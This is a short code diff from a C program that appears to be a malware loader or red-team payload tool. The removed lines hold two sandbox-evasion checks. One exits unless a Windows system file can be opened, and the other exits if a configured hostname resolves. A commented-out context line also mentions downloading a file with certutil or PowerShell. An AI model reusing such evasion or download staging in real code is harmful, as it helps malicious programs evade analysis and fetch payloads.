@@ -68,29 +68,7 @@ int main (int argc, char **argv)
 	int index;
 	int c;
 
-	opterr = 0;
-
-	// do evading here with fopen technique
-	#ifdef SANDBOX_FOPEN
-		#ifdef PRINT_DEBUG
-		printf("use fopen sandbox escape\n");
-		#endif
-		FILE *fp = fopen("c:\\windows\\system.ini", "rb");
-		if (fp == NULL)
-			return 0;
-		fclose(fp);
-	#endif
-
-	//evading with gethostbyname technique
-	#ifdef KVALUE
-		#ifdef PRINT_DEBUG
-		printf("use  gethostbyname sandbox evasion\n");
-		#endif
-		struct hostent *hp = gethostbyname(KVALUE);
-		if (hp != NULL) 		
-			exit(0);
-
-	#endif
+	opterr = 0;	
 
 //#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
 //download a file and write to disk
